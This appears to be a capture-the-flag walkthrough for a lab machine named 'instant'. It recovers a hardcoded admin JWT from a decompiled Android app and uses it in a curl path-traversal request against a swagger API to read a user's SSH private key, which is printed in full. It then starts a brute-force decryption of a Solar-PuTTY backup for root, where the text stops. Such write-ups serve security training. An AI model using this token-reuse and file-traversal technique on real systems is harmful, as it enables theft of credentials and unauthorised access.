Decompile the apk,After decompiling it you will find this file `AdminActivities.java`
which contains a cookie 
```java
Private String TestAdminAuthorization() {
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() {
            static final /* synthetic */ boolean $assertionsDisabled = false;

            static {
                Class<AdminActivities> cls = AdminActivities.class;
            }

```
How ever it leaks a new sub domain which is kinda useless after fuzzing for some domains you will encounter this one  `swagger-ui.instant.htb` we can hijack the session using the cookie
```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq -r
```
Like that we got user ssh keys we can now log in.

```sh
{
  "/home/shirohige/logs/../.ssh/id_rsa": [
    "-----BEGIN RSA PRIVATE KEY-----\n",
    "MIIEpAIBAAKCAQEAoJ7uID8Aj578+8dz9dC1Nw8qwZ8cLd4m0H7DbJ08LgqNGlpE\n",
    "/0N6psoEeTGOx4T4YxAhYdUySaBeCruGdBCI0elqGb7cwyufb3C7VuhCDQlmCi1L\n",
    "Qu8EW7+ifGB3FunyWWaEPMpTI9GUFwhD/zqp6s/5jmgr3imZkyXkywQJSsGAy29o\n",
    "uXrigZpYjreUoC9ccOtAtAGC+BzBXV9Em02bY17uJhc/YM9QNzwlJO81UrIdJwEr\n",
    "9H0d0lg1DcacxnLXuC56iDfoaqtUUzkLJcFdTM9gz6JnfMeBIh4fmgNgm1R/DeiJ\n",
    "WjFNs7B6TsHV8DwJqJoUphrTtEmsRtNSdkbd8wIDAQABAoIBAEB77fAGOyxt0PUo\n",
    "OxbaJpanQSwgu8hyYrTb34tQiOOXGtUUnpS4u5oQisE5MzBI4wuqYyyK0jia6IZ4\n",
    "iN858CQOCKmzZZ/5eHXeFWgrsLDZMB0v2AJUQTSweARlGgqZ+9EGhlp9g+lib4jb\n",
    "qajjHWqG+pLAobP8kYpw8SzMPwrCiAZGHK0hhzcUrSic3MaFJm6G0LTo6uhta9ar\n",
    "NduhFoSSB8SFfUcSCpC5RJn/7CStCz8KtgMZqmY4NmywQVZq95U9pnIwz4FAdS43\n",
    "T7HMsdPP8bAjaRkKPr4/GtSJewepKEB7CINDMdH0CoDYDKw+AUucIO8hB0UYCH+v\n",
    "s53pAWECgYEA0w8gvG4s/Nw9kkpQyBwdKmww3Vwm2zpBNmWcCebLTVwqfq9Z8ACd\n",
    "TgOzTxVa6TAHk0+apBSe+yq2DkUOY7mRRUBWxNix4hR1TXyNaN1nmqjVgqF+lDTc\n",
    "tvYqgXXIHidkkZusEBht+m21I2BsgjFidouTIf9OPiRhWdyA23OZ9dECgYEAwtJm\n",
    "/PsUkN1Rwg+lg2Ia7Ge05fBXvjHQVOEQBXInCcH2YqdxuK9zceHEY5FrALvNG+xg\n",
    "2Rm23vJLMLWajnidrYPO1tYl8jwE1CtJFPngUSNIV+YcB4t8sJPd9996V4a0QXTj\n",
    "wfbvJboUKl6oe4IcLe/vbPtBAbyN8jDMOuJd1IMCgYEAzUdDccI/I1ka0bRSSa9+\n",
    "dopwJHzClitczgmZ8M93ITDpa/olIZeXaA+VUO/WUkOSuqaMI9aiomvyUoK78ibE\n",
    "snRXcHHK4bdAODNSXpIpeHWJ5NoqAQBBQ/q9cNkb4Kgz2qNsgOMh5JbbvSLFpwNd\n",
    "Xyt12XU1pp8/yGT9N3SCZGECgYBnXqYAcuRNnPClbBHg7Svl5XzJSEX2B45Hiwcq\n",
    "LJBkEANAAyJG4Oj7MtQ2FFFXGU5SE5CrgIZUMvEMTj9MetkG2Nnlicimh4v0W2cy\n",
    "dwa7ZmIbKWAT7MHjGwH6ZBwQ1stLs86o+vGW7e2HMaRpq/ZxtU4vX/z1A+u45oVm\n",
    "dPdeKwKBgQC+JXhTU6uVhBY/1Js6UAjqTrVCqnHhk236jy6XbAehan+1RhQ351s1\n",
    "Trhg66OIqr8RRKA9ofj/6jo5mfa3e4GdN77scVnGF6lH0Z+X+U/hOG9NweISIn2n\n",
    "BDDv3HZleKMw3pcLlpPLA3m4IOd2J2XtAwYDAqA8L3PKDJQBHUgkAw==\n",
    "-----END RSA PRIVATE KEY-----\n"
  ],
  "Status": 201
}

```
Formatted version 
```sh
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAoJ7uID8Aj578+8dz9dC1Nw8qwZ8cLd4m0H7DbJ08LgqNGlpE
/0N6psoEeTGOx4T4YxAhYdUySaBeCruGdBCI0elqGb7cwyufb3C7VuhCDQlmCi1L
Qu8EW7+ifGB3FunyWWaEPMpTI9GUFwhD/zqp6s/5jmgr3imZkyXkywQJSsGAy29o
uXrigZpYjreUoC9ccOtAtAGC+BzBXV9Em02bY17uJhc/YM9QNzwlJO81UrIdJwEr
9H0d0lg1DcacxnLXuC56iDfoaqtUUzkLJcFdTM9gz6JnfMeBIh4fmgNgm1R/DeiJ
WjFNs7B6TsHV8DwJqJoUphrTtEmsRtNSdkbd8wIDAQABAoIBAEB77fAGOyxt0PUo
OxbaJpanQSwgu8hyYrTb34tQiOOXGtUUnpS4u5oQisE5MzBI4wuqYyyK0jia6IZ4
iN858CQOCKmzZZ/5eHXeFWgrsLDZMB0v2AJUQTSweARlGgqZ+9EGhlp9g+lib4jb
qajjHWqG+pLAobP8kYpw8SzMPwrCiAZGHK0hhzcUrSic3MaFJm6G0LTo6uhta9ar
NduhFoSSB8SFfUcSCpC5RJn/7CStCz8KtgMZqmY4NmywQVZq95U9pnIwz4FAdS43
T7HMsdPP8bAjaRkKPr4/GtSJewepKEB7CINDMdH0CoDYDKw+AUucIO8hB0UYCH+v
s53pAWECgYEA0w8gvG4s/Nw9kkpQyBwdKmww3Vwm2zpBNmWcCebLTVwqfq9Z8ACd
TgOzTxVa6TAHk0+apBSe+yq2DkUOY7mRRUBWxNix4hR1TXyNaN1nmqjVgqF+lDTc
tvYqgXXIHidkkZusEBht+m21I2BsgjFidouTIf9OPiRhWdyA23OZ9dECgYEAwtJm
/PsUkN1Rwg+lg2Ia7Ge05fBXvjHQVOEQBXInCcH2YqdxuK9zceHEY5FrALvNG+xg
2Rm23vJLMLWajnidrYPO1tYl8jwE1CtJFPngUSNIV+YcB4t8sJPd9996V4a0QXTj
wfbvJboUKl6oe4IcLe/vbPtBAbyN8jDMOuJd1IMCgYEAzUdDccI/I1ka0bRSSa9+
dopwJHzClitczgmZ8M93ITDpa/olIZeXaA+VUO/WUkOSuqaMI9aiomvyUoK78ibE
snRXcHHK4bdAODNSXpIpeHWJ5NoqAQBBQ/q9cNkb4Kgz2qNsgOMh5JbbvSLFpwNd
Xyt12XU1pp8/yGT9N3SCZGECgYBnXqYAcuRNnPClbBHg7Svl5XzJSEX2B45Hiwcq
LJBkEANAAyJG4Oj7MtQ2FFFXGU5SE5CrgIZUMvEMTj9MetkG2Nnlicimh4v0W2cy
dwa7ZmIbKWAT7MHjGwH6ZBwQ1stLs86o+vGW7e2HMaRpq/ZxtU4vX/z1A+u45oVm
dPdeKwKBgQC+JXhTU6uVhBY/1Js6UAjqTrVCqnHhk236jy6XbAehan+1RhQ351s1
Trhg66OIqr8RRKA9ofj/6jo5mfa3e4GdN77scVnGF6lH0Z+X+U/hOG9NweISIn2n
BDDv3HZleKMw3pcLlpPLA3m4IOd2J2XtAwYDAqA8L3PKDJQBHUgkAw==
-----END RSA PRIVATE KEY-----
```
## Path to root 
visiting /opt we get this file `/opt/backups/Solar-PuTTY:sessions-backup.dat`
let brute force decrypting  it we get this (check in the current folder for the tool)
